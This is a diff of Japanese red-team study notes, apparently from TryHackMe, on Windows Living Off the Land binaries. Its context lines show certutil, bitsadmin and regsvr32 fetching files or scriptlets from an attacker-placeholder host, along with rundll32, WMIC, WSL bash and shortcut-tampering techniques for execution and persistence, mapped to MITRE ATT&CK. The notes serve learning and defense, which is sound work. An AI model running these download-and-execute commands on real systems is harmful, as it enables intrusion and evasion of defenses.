@@ -1,3 +1,6 @@
+>[!NOTE]
+>OSCP試験においては、このテクニックは求められない。
+
 # Intro
 
 - Living Off the Landは、レッドチーム・コミュニティのトレンド用語
@@ -47,13 +50,13 @@
 | [Portmon](https://docs.microsoft.com/en-us/sysinternals/downloads/portmon)       | システム上の全シリアル・パラレルポートの動作を監視・表示                            |
 | [Whois](https://docs.microsoft.com/en-us/sysinternals/downloads/whois)           | 指定したドメイン名またはIPアドレスの情報を提供                                |
 
-- Sysinternalsの詳細は[こちら](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
+- 🔗[Sysinternalsの詳細](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
 
 ## Sysinternals Live
 
 - Windows Sysinternalsの大きな特徴の一つは、インストール不要で使える点
 - MicrosoftはSysinternals Liveサービスを提供しており、以下の方法でアクセス・使用できる：
-	- Webブラウザ（[link](https://live.sysinternals.com/)）
+	- Webブラウザ（🔗[link](https://live.sysinternals.com/)）
 	- Windows Share
 	- コマンドプロンプト
 - ツールを使うには、ダウンロードするか、Sysinternals Liveのパス `\\live.sysinternals.com\tools` をWindows Explorer（File Explorer）に入力する
@@ -118,7 +121,7 @@
 - Certutilは、認証サービスを処理するためのWindows組み込みユーティリティ
 - 認証局（CA）構成情報およびその他のCAコンポーネントをダンプして表示するために使用される
 - 通常の用途は証明書情報の取得だが、**認証サービスとは無関係なファイルの転送やエンコードが可能**であることが判明している
-- MITRE ATT&CKフレームワークでは Ingress Tool Transfer（[T1105](https://attack.mitre.org/techniques/T1105/)）として識別
+- MITRE ATT&CKフレームワークでは Ingress Tool Transfer（🔗[T1105](https://attack.mitre.org/techniques/T1105/)）として識別
 - 主に、不審なファイル転送やファイルの隠蔽に使用される
 
 
@@ -129,19 +132,19 @@ certutil -URLcache -split -f http://<attacker_IP>:<PORT>/<File> C:\Windows\Temp\
 - `-URLcache`：URLオプションを有効にする
 - `-split -f`：指定されたURLからファイルを分割して強制取得する
 
-ファイルをBase64エンコード・デコードするエンコーディングツールとしても使用可能（ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/)）：
+ファイルをBase64エンコード・デコードするエンコーディングツールとしても使用可能（ATT&CK 🔗[T1027](https://attack.mitre.org/techniques/T1027/)）：
 ```powershell
 certutil -encode <エンコードするファイル> <エンコード後のファイル名>
 certutil -decode <デコードするファイル> <デコード後のファイル名>
 ```
-- 詳細は [Microsoft Docs: CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
+- 詳細は🔗[Microsoft Docs: CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
 
 ## BITSAdmin
 
 - Background Intelligent Transfer Service（BITS）ジョブの作成・ダウンロード・アップロード・進行状況確認に使用できるシステム管理者用ユーティリティ
-- [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) は、HTTPウェブサーバーやSMBサーバーからファイルをダウンロード・アップロードするための低帯域幅・非同期な方法
+- 🔗[BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) は、HTTPウェブサーバーやSMBサーバーからファイルをダウンロード・アップロードするための低帯域幅・非同期な方法
 - 攻撃者はBITSジョブを悪用して、侵害済みマシンに悪意のあるペイロードをダウンロード・実行できる
-- ATT&CK [T1197](https://attack.mitre.org/techniques/T1197/)
+- ATT&CK 🔗[T1197](https://attack.mitre.org/techniques/T1197/)
 - 主に、悪意のあるペイロードのダウンロードや実行に使用される
 
 指定したURLからファイルをダウンロード
@@ -152,11 +155,11 @@ bitsadmin.exe /transfer /Download /priority Foreground http://<attacker_IP>/<Fil
 - `/Download`：ダウンロードタイプとして転送を指定
 - `/priority Foreground`：最優先でフォアグラウンド実行
 
-- パラメータの詳細は [Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer)
+- パラメータの詳細は 🔗[Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer)
 
 ## FindStr
 
-- [Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) は、ファイル内のテキストや文字列パターンを検索するためのMicrosoft組み込みツール
+- 🔗[Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) は、ファイル内のテキストや文字列パターンを検索するためのMicrosoft組み込みツール
 - 通常はファイルや解析済み出力の内容検索に使用される（例：`netstat -an | findstr "445"`）
 - **SMB共有フォルダからリモートファイルをダウンロードできる**ことが判明している
 
@@ -197,7 +200,7 @@ explorer.exe /root,"<file_to_execute>"
 
 - Windows Management Instrumentation（WMIC）は、Windowsコンポーネントを管理するコマンドラインユーティリティ
 - 防御策を回避するためのバイナリ実行にも悪用される
-- MITRE ATT&CK：Signed Binary Proxy Execution（[T1218](https://attack.mitre.org/techniques/T1218/)）
+- MITRE ATT&CK：Signed Binary Proxy Execution（🔗[T1218](https://attack.mitre.org/techniques/T1218/)）
 
 任意のバイナリの新しいプロセスを作成（例：`calc.exe`）
 ```powershell
@@ -210,7 +213,7 @@ wmic.exe process call create calc
 
 - OS内でDLLファイルをロードして実行するMicrosoft組み込みのツール
 - 任意のペイロード実行や、JavaScriptおよびPowerShellスクリプトの実行に悪用できる
-- MITRE ATT&CK：Signed Binary Proxy Execution（[T1218](https://attack.mitre.org/techniques/T1218/011/)）
+- MITRE ATT&CK：Signed Binary Proxy Execution（🔗[T1218](https://attack.mitre.org/techniques/T1218/011/)）
 
 - バイナリの場所：
 	- 32bit：`C:\Windows\System32\rundll32.exe`
@@ -289,7 +292,7 @@ c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct <path_t
 ## Bash（WSL経由）
 
 - MicrosoftはWindows 10/11・Server 2019でLinux環境のサポートを追加した
-- この機能はWindows Subsystem for Linux（[WSL](https://docs.microsoft.com/en-us/windows/wsl/about)）として知られ、[WSL1とWSL2](https://docs.microsoft.com/en-us/windows/wsl/compare-versions)が存在する
+- この機能はWindows Subsystem for Linux（🔗[WSL](https://docs.microsoft.com/en-us/windows/wsl/about)）として知られ、🔗[WSL1とWSL2](https://docs.microsoft.com/en-us/windows/wsl/compare-versions)が存在する
 - WSLはHyper-V仮想化Linuxディストリビューションで、Linuxカーネルとシステムコールのサブセットをサポート
 - `bash.exe` はLinux環境と対話するためのMicrosoftツール
 
@@ -298,7 +301,7 @@ c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct <path_t
 bash.exe -c <path-to-payload>
 ```
 
-- MITRE ATT&CK：Indirect Command Execution（[T1202](https://attack.mitre.org/techniques/T1202/)）
+- MITRE ATT&CK：Indirect Command Execution（🔗[T1202](https://attack.mitre.org/techniques/T1202/)）
 
 ![600](../画像ファイル/Pasted%20image%2020230623172928.png)
 
@@ -311,12 +314,10 @@ bash.exe -c <path-to-payload>
 
 ## Shortcuts
 
-[ショートカットファイル（lnk）のバックドア化](../TryHackME/Red%20Teaming/3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)
-
 - ショートカット（シンボリックリンク）は、OS内で他のファイルやアプリケーションを参照するためのテクニック
 - ユーザーがクリックすると参照先のファイルやアプリケーションが実行される
 - 攻撃者は初期アクセス・権限昇格・永続性の取得に悪用する
-- MITRE ATT&CK：[T1547](https://attack.mitre.org/techniques/T1547/009/)
+- MITRE ATT&CK：🔗[T1547](https://attack.mitre.org/techniques/T1547/009/)
 
 - ショートカット変更テクニックでは、`Target:`に以下のいずれかを設定してファイルを実行する：
 	- Rundll32
@@ -328,13 +329,13 @@ bash.exe -c <path-to-payload>
 
 - 上図の例では、攻撃者がExcelのショートカットのTarget:を変更し、`rundll32.exe` を使って `calc.exe` を実行させている
 - ターゲットがExcelのショートカットアイコンをクリックすると、`calc.exe` が実行される
-- 詳細は[こちら](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)のGitHubリポジトリを参照
+- 詳細は🔗[こちら](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)のGitHubリポジトリを参照
 
 ## No PowerShell!（PowerLessShell）
 
 ### 基本
 
-- [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
+- 🔗[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
 - 2019年、Red Canaryの脅威検出レポートで、PowerShellが悪意のある活動に最も使用される手法であることが報告された
 - これにより組織が `powershell.exe` の実行を監視・ブロックするようになったため、**攻撃者は `powershell.exe` を使用せずスクリプトを実行する**手法が必要となった
 
